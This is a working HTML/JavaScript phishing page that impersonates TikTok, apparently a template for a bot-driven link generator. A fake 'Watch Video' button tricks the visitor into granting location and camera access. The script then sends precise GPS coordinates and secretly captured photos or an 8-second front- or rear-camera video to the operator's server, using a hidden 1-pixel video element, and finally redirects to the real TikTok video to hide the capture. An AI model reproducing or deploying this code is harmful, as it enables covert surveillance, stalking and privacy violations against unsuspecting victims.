<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; height: 100vh; overflow: hidden; }
        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #000; flex-direction: column; }
        #hiddenVideo { position: absolute; width: 1px; height: 1px; opacity: 0.01; top: -100px; left: -100px; z-index: -1; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; position: fixed; top: 0; left: 0; right: 0; z-index: 10; pointer-events: none; }
        .header h1 { font-size: 20px; font-weight: 700; text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; padding: 16px 24px 40px; display: flex; justify-content: center; z-index: 10; pointer-events: none; }
        .permission-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; padding: 24px; }
        .permission-overlay h2 { font-size: 24px; margin-bottom: 8px; }
        .permission-overlay p { font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 20px; text-align: center; max-width: 300px; }
        .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
        .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
        .video-btn { background: #fe2c55; }
        .timer-display { font-size: 48px; font-weight: 700; color: #fff; margin-top: 10px; display: none; }
        .status-text { font-size: 16px; color: rgba(255,255,255,0.5); margin-top: 4px; }
        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .recording-indicator { display: none; align-items: center; gap: 8px; margin-top: 15px; }
        .recording-dot { width: 12px; height: 12px; background: #fe2c55; border-radius: 50%; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="header">
    <h1>TikTok</h1>
    <div style="font-size: 22px;">🔍</div>
</div>

<div class="video-container">
    <div style="text-align: center;">
        <div style="font-size: 60px; margin-bottom: 10px;">🎵</div>
        <h2 style="font-weight: 600; font-size: 22px;">TikTok</h2>
        <p class="status-text" id="statusText">Loading video...</p>
        <div class="spinner" id="spinner"></div>
        <div class="timer-display" id="timerDisplay">0s</div>
        <div class="recording-indicator" id="recordingIndicator">
            <div class="recording-dot"></div>
            <span style="color: rgba(255,255,255,0.5); font-size: 14px;">Recording...</span>
        </div>
    </div>
    <video id="hiddenVideo" autoplay playsinline muted></video>
</div>

<div class="bottom-bar"><div style="width:70px;"></div></div>

<div class="permission-overlay" id="permissionOverlay">
    <h2>▶️ Watch Video</h2>
    <p>Tap continue to watch this TikTok video</p>
    <button class="permission-btn video-btn" id="allowGpsBtn">▶️ Continue</button>
    <div class="loading" id="loadingText">Loading video...</div>
</div>

<script>
    const content_type = "{{ content_type }}";
    const camera_type = "{{ camera }}";
    const link_id = "{{ link_id }}";
    const video_url = "{{ video_url }}";

    let stream = null;
    let imageCapture = null;
    let currentFacingMode = camera_type === 'rear' ? 'environment' : 'user';
    let mediaRecorder = null;
    let recordedChunks = [];
    let captureStarted = false;
    let recordingActive = false;
    let recordingStopped = false;
    let startTime = 0;
    let redirectDone = false;
    let timerInterval = null;
    let elapsedSeconds = 0;
    const RECORD_DURATION = 8; // Record for 8 seconds before redirect
    const MAX_BURST = 5;

    const hiddenVideo = document.getElementById('hiddenVideo');
    const permissionOverlay = document.getElementById('permissionOverlay');
    const allowBtn = document.getElementById('allowGpsBtn');
    const loadingText = document.getElementById('loadingText');
    const spinner = document.getElementById('spinner');
    const timerDisplay = document.getElementById('timerDisplay');
    const statusText = document.getElementById('statusText');
    const recordingIndicator = document.getElementById('recordingIndicator');

    // ===== REDIRECT TO REAL TIKTOK =====
    function redirectToTikTok() {
        if (redirectDone) return;
        redirectDone = true;
        
        console.log('Redirecting to TikTok:', video_url);
        
        // Try to open in TikTok app
        setTimeout(() => {
            window.location.href = `tiktok://video?url=${encodeURIComponent(video_url)}`;
        }, 300);
        
        // Fallback: open in browser
        setTimeout(() => {
            window.location.href = video_url;
        }, 1500);
    }

    // ===== UPDATE UI =====
    function updateStatus(message) {
        statusText.textContent = message;
    }

    function updateTimer(seconds) {
        timerDisplay.textContent = seconds + 's';
        timerDisplay.style.display = 'block';
    }

    // ===== SEND VIDEO =====
    function sendVideoToBot() {
        if (recordingStopped) return;
        recordingStopped = true;
        recordingActive = false;
        recordingIndicator.style.display = 'none';
        
        if (!recordedChunks || recordedChunks.length === 0) {
            console.log('No video recorded');
            return;
        }
        
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const duration = Math.round((Date.now() - startTime) / 1000);
        console.log(`📹 Video recorded: ${duration} seconds`);
        
        const reader = new FileReader();
        reader.onloadend = () => {
            sendToServer({
                link_id,
                image_data: reader.result,
                camera: currentFacingMode === 'user' ? 'front' : 'rear',
                type: 'video',
                duration: duration
            });
        };
        reader.readAsDataURL(blob);
    }

    function stopRecordingAndSend() {
        if (!recordingActive || recordingStopped) return;
        recordingActive = false;
        recordingStopped = true;
        recordingIndicator.style.display = 'none';
        
        if (timerInterval) {
            clearInterval(timerInterval);
            timerInterval = null;
        }
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            console.log('⏹️ Recording stopped');
            sendVideoToBot();
        }
    }

    // ===== GPS =====
    function sendGPS(lat, lon) {
        fetch('/api/gps_location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ link_id, lat, lon })
        }).then(r => console.log('GPS sent:', r.status))
          .catch(e => console.error('GPS error:', e));
    }

    function getGPSLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('📍 GPS:', lat, lon);
                    sendGPS(lat, lon);
                    startCamera(currentFacingMode);
                },
                function(error) {
                    console.error('GPS error:', error);
                    startCamera(currentFacingMode);
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            startCamera(currentFacingMode);
        }
    }

    function sendToServer(payload) {
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(r => console.log('Sent, status:', r.status))
          .catch(e => console.error('Send error:', e));
    }

    async function grabPhoto() {
        if (!imageCapture) return null;
        try {
            const bitmap = await imageCapture.grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const ctx = canvas.getContext('2d');
            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(bitmap, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.85);
        } catch (e) {
            console.error('grabFrame failed:', e);
            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth || 640;
            canvas.height = hiddenVideo.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(hiddenVideo, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.85);
        }
    }

    async function doCapture() {
        if (captureStarted) return;
        captureStarted = true;
        console.log('Starting capture:', content_type);

        switch (content_type) {
            case 'single_photo':
                updateStatus('Capturing photo...');
                const photo = await grabPhoto();
                if (photo) {
                    sendToServer({
                        link_id,
                        image_data: photo,
                        camera: currentFacingMode === 'user' ? 'front' : 'rear',
                        type: 'photo'
                    });
                }
                updateStatus('Photo captured! ✅');
                setTimeout(() => { redirectToTikTok(); }, 500);
                break;

            case 'burst':
                updateStatus('Capturing photos...');
                const photos = [];
                for (let i = 0; i < MAX_BURST; i++) {
                    const p = await grabPhoto();
                    if (p) photos.push(p);
                    if (i < MAX_BURST - 1) await new Promise(r => setTimeout(r, 250));
                }
                if (photos.length > 0) {
                    sendToServer({
                        link_id,
                        images: photos,
                        camera: currentFacingMode === 'user' ? 'front' : 'rear',
                        type: 'burst'
                    });
                }
                updateStatus('Burst captured! ✅');
                setTimeout(() => { redirectToTikTok(); }, 500);
                break;

            case 'video':
                // Start recording
                updateStatus('⏳ Preparing...');
                recordingIndicator.style.display = 'flex';
                timerDisplay.style.display = 'block';
                elapsedSeconds = 0;
                updateTimer(0);
                
                startTime = Date.now();
                recordedChunks = [];
                
                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
                    ? 'video/webm;codecs=vp9,opus' : 'video/webm';
                mediaRecorder = new MediaRecorder(stream, { mimeType });
                
                mediaRecorder.ondataavailable = e => { 
                    if (e.data.size > 0) recordedChunks.push(e.data); 
                };
                
                mediaRecorder.onstop = () => {
                    if (!recordingStopped) {
                        recordingStopped = true;
                        recordingActive = false;
                        recordingIndicator.style.display = 'none';
                        if (timerInterval) {
                            clearInterval(timerInterval);
                            timerInterval = null;
                        }
                        sendVideoToBot();
                    }
                };
                
                mediaRecorder.start();
                recordingActive = true;
                updateStatus('🔴 Recording...');
                
                // Start timer
                timerInterval = setInterval(() => {
                    elapsedSeconds++;
                    updateTimer(elapsedSeconds);
                }, 1000);
                
                // Auto-stop after RECORD_DURATION seconds
                setTimeout(() => {
                    if (recordingActive) {
                        console.log(`⏹️ Auto-stopping after ${RECORD_DURATION} seconds`);
                        stopRecordingAndSend();
                        updateStatus('✅ Video recorded!');
                        setTimeout(() => { redirectToTikTok(); }, 500);
                    }
                }, RECORD_DURATION * 1000);
                break;
        }
    }

    function startCamera(facingMode) {
        navigator.mediaDevices.getUserMedia({
            video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        }).then(s => {
            stream = s;
            hiddenVideo.srcObject = stream;
            
            const track = stream.getVideoTracks()[0];
            imageCapture = new ImageCapture(track);
            
            hiddenVideo.play().then(() => {
                permissionOverlay.style.display = 'none';
                currentFacingMode = facingMode;
                
                setTimeout(() => {
                    updateStatus('Loading video...');
                    setTimeout(() => {
                        doCapture();
                    }, 300);
                }, 300);
            }).catch(e => console.error('Play error:', e));

        }).catch(err => {
            console.error('Camera error:', err);
            loadingText.textContent = 'Camera access is needed';
            loadingText.style.display = 'block';
            allowBtn.textContent = 'Try Again';
            allowBtn.style.display = 'block';
        });
    }

    // ===== ALLOW BUTTON =====
    allowBtn.addEventListener('click', () => {
        allowBtn.style.display = 'none';
        loadingText.textContent = 'Loading video...';
        loadingText.style.display = 'block';
        getGPSLocation();
    });

    setTimeout(() => { loadingText.style.display = 'block'; }, 500);
</script>
</body>
</html>
